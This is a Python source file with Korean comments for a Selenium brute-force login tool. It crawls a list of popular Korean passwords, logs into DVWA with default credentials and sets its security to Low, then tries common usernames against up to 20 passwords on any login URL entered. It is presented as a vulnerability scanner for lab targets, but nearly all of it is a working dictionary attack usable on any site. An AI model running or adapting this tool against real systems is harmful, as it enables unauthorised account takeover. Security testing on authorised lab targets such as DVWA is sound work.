from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait, Select
from selenium.webdriver.support import expected_conditions as EC
from brute_force_crawling import get_korean_password_list_with_selenium, url as crawl_url
import sys
import time
from urllib.parse import urlparse, urlunparse
import random

# =========================================================
# 🌟 Brute Force 스캐너 설정 (데이터 연동) 🌟
# =========================================================

USERNAME_LIST = ["admin", "user", "test", "root"]

CRAWLED_PASSWORDS = []
PASSWORD_LIST = []
try:
    CRAWLED_PASSWORDS = get_korean_password_list_with_selenium(crawl_url)

    if CRAWLED_PASSWORDS:
        # 크롤링된 목록의 순위를 존중하며 중복 제거
        unique_passwords = []
        for p in CRAWLED_PASSWORDS:
            if p not in unique_passwords:
                unique_passwords.append(p)

        PASSWORD_LIST = unique_passwords
    else:
        # 크롤링 실패 시 빈 리스트로 초기화 (아래 main 함수에서 즉시 종료)
        PASSWORD_LIST = []

except Exception:
    PASSWORD_LIST = []


# 🚨 [오류 해결] DVWA 및 일반 웹사이트의 성공/실패 지표를 명확히 분리 정의합니다.
# DVWA 지표
DVWA_SUCCESS_INDICATORS = ["Welcome to the password protected area", "Logout"]
DVWA_FAILURE_INDICATORS = ["Username and/or password incorrect", "Login Failed", "login and/or password incorrect"]

# 일반 웹사이트 지표 (vulnerable_login.php 기준)
GENERIC_SUCCESS_INDICATORS = ["✅ 로그인 성공: 환영합니다"]
GENERIC_FAILURE_INDICATORS = ["❌ 사용자 이름 또는 비밀번호가 올바르지 않습니다"]


# =========================================================
# 🌟 Selenium 기반 Brute Force 스캐너 🌟
# =========================================================

def setup_driver():
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')
    options.add_argument('--no-sandbox')
    service = Service()
    return webdriver.Chrome(service=service, options=options)


def perform_dvwa_login_and_setup(driver, base_url):
    wait_long = WebDriverWait(driver, 20)

    LOGIN_URL = base_url + "login.php"
    SECURITY_URL = base_url + "security.php"

    print(f"\n[STEP 1] DVWA 접속 및 관리자 로그인 시도...")
    driver.get(LOGIN_URL)

    try:
        username_input = wait_long.until(EC.presence_of_element_located((By.NAME, "username")))
        password_input = wait_long.until(EC.presence_of_element_located((By.NAME, "password")))
        login_button = wait_long.until(EC.presence_of_element_located((By.NAME, "Login")))

        username_input.send_keys("admin")
        password_input.send_keys("password")
        login_button.click()
        time.sleep(2)

        if "Logout" in driver.page_source:
            print("✅ 초기 로그인 성공 (admin/password)! 세션 확보.")

            driver.get(SECURITY_URL)
            time.sleep(2)

            select_element = wait_long.until(EC.presence_of_element_located((By.NAME, "security")))
            Select(select_element).select_by_value('low')

            submit_button = driver.find_element(By.NAME, 'seclev_submit')
            submit_button.click()
            time.sleep(2)

            print("✅ 보안 레벨 'Low' 설정 완료.")
            return True
        else:
            print("❌ 초기 로그인 실패. admin/password 또는 DVWA 상태를 확인하세요.")
            return False

    except Exception as e:
        print(f"❌ 초기 로그인 중 오류 발생: {type(e).__name__}. URL: {driver.current_url}")
        return False


def scan_brute_force_with_selenium(driver, target_url, is_dvwa):
    vulnerabilities = []
    wait = WebDriverWait(driver, 15)

    # 🚨 NameError 해결: is_dvwa 여부에 따라 정의된 지표를 정확히 선택합니다.
    success_indicators = DVWA_SUCCESS_INDICATORS if is_dvwa else GENERIC_SUCCESS_INDICATORS
    failure_indicators = DVWA_FAILURE_INDICATORS if is_dvwa else GENERIC_FAILURE_INDICATORS

    shuffled_usernames = USERNAME_LIST[:]
    random.shuffle(shuffled_usernames)

    passwords_to_attempt = PASSWORD_LIST[:20]

    print(f"\n[STEP 2] {target_url} 페이지로 이동하여 스캔 시작...")
    driver.get(target_url)

    total_attempts = len(shuffled_usernames) * len(passwords_to_attempt)
    print(f"[+] Brute Force 공격 시작: 총 {total_attempts}가지 조합으로 정답을 찾습니다.")
    print(f"[INFO] ID 시도 순서: {', '.join(shuffled_usernames)}")

    USER_FIELD = (By.NAME, "username")
    PASS_FIELD = (By.NAME, "password")
    LOGIN_BUTTON = (By.NAME, "Login")

    for user in shuffled_usernames:
        for passwd in passwords_to_attempt:

            print(f"  [ATTEMPT] ID='{user}', PW='{passwd}' 시도 중...")

            try:
                username_input = wait.until(EC.presence_of_element_located(USER_FIELD))
                password_input = wait.until(EC.presence_of_element_located(PASS_FIELD))
                login_button = wait.until(EC.presence_of_element_located(LOGIN_BUTTON))
            except Exception:
                print("  [ERROR] 로그인 폼 요소를 찾을 수 없습니다. (이름이 'username', 'password', 'Login'이 아닐 수 있습니다.)")
                return vulnerabilities

            username_input.clear()
            username_input.send_keys(user)
            password_input.clear()
            password_input.send_keys(passwd)

            login_button.click()
            time.sleep(1.5)

            page_source = driver.page_source.lower()

            is_success = any(indicator.lower() in page_source for indicator in success_indicators)
            is_failure = any(indicator.lower() in page_source for indicator in failure_indicators)

            # DVWA 전용 오탐 방지 로직
            if is_dvwa:
                is_success = is_success and (not is_failure)

            if is_success:
                vulnerabilities.append({
                    "type": "Brute Force (Successful Login)",
                    "details": f"성공적인 로그인: ID='{user}', PW='{passwd}'"
                })
                print(f"🎉 **[SUCCESS]** ID='{user}', PW='{passwd}' - 로그인 성공! 취약점 발견!")
                return vulnerabilities

            elif is_failure:
                print(f"  [FAIL] ID='{user}', PW='{passwd}' -> 비밀번호 불일치")

            else:
                print(f"  [INFO] ID='{user}', PW='{passwd}' -> 응답 모호 (계속 시도)")

    return vulnerabilities


def print_password_list(password_list, source_url):
    if not password_list:
        print("\n--- 📝 크롤링된 사전 공격 목록 ---")
        print("  [경고] 비밀번호 목록이 비어있거나 크롤링에 실패했습니다. 스캐너를 종료합니다.")
        print("-------------------------------------")
        return

    print("\n--- 📝 크롤링된 사전 공격 목록 ---")

    passwords_to_display = password_list
    max_display = min(len(passwords_to_display), 20)

    current_index = 0

    while current_index < max_display:
        end_index = min(current_index + 7, max_display)

        line = []
        for i in range(current_index, end_index):
            line.append(f"{i + 1}위: {passwords_to_display[i]}")

        print('  ' + ' | '.join(line))
        current_index = end_index

    print(f"\n출처 : {source_url}")
    print("-------------------------------------")


def main():
    global PASSWORD_LIST

    print("--- 🛡️ Brute Force (무차별 대입) 탐지 스캐너 ---")

    full_url = input("테스트할 Brute Force 취약점 페이지 전체 URL을 입력하세요 : ").strip()

    if not full_url.startswith('http'):
        print("[-] URL은 'http' 또는 'https'로 시작해야 합니다. 종료합니다.")
        sys.exit(1)

    # 크롤링 실패 시 즉시 종료 로직
    if not PASSWORD_LIST:
        print("\n❌ 스캐너 실패: 유효한 사전 공격 목록을 확보하지 못했습니다. (크롤링 실패)")
        print_password_list(PASSWORD_LIST, crawl_url)
        sys.exit(1)

    # 크롤링 성공 시 목록 출력
    print_password_list(PASSWORD_LIST, crawl_url)

    driver = None
    results = []

    try:
        driver = setup_driver()

        is_dvwa = "/dvwa/" in full_url.lower()

        if is_dvwa:
            print("\n[INFO] DVWA 환경을 감지했습니다. 초기 로그인 및 보안 레벨 설정을 시작합니다.")

            parsed_url = urlparse(full_url)
            path_segments = parsed_url.path.split('/')
            dvwa_index = path_segments.index('dvwa') if 'dvwa' in path_segments else -1

            if dvwa_index != -1:
                base_path = '/'.join(path_segments[:dvwa_index + 1]) + '/'
                base_url = urlunparse(parsed_url._replace(path=base_path, params='', query='', fragment=''))

                if not perform_dvwa_login_and_setup(driver, base_url):
                    print("❌ DVWA 초기 설정에 실패하여 스캔을 중단합니다.")
                    return
            else:
                print("[-] DVWA 기본 URL을 추출할 수 없습니다. DVWA 설정을 건너뛰고 바로 스캔을 시도합니다.")

        # 일반 웹 / DVWA 모두 이 함수 사용 (DVWA 여부 플래그 전달)
        results = scan_brute_force_with_selenium(driver, full_url, is_dvwa)

    except Exception as e:
        print(f"최종 오류 발생: {type(e).__name__} - {e}")

    finally:
        if driver:
            driver.quit()

    print("\n--- 🏁 스캔 결과 보고서 ---")
    if results:
        print(f"\n🚨🚨 **Brute Force 취약점 징후가 발견되었습니다.** 🚨🚨")
        for vuln in results:
            print(f"  - **취약점 있음**: {vuln.get('details', 'N/A')}")
            print(f"  - **권고 사항**: 사전/무차별 대입 공격에 취약합니다. 비밀번호 복잡성 강화 및 Rate Limiting을 적용해야 합니다.")
    else:
        print("\n🎉 Brute Force 취약점 징후가 발견되지 않았습니다. (목록의 비밀번호가 정답이 아님)")


if __name__ == '__main__':
    main()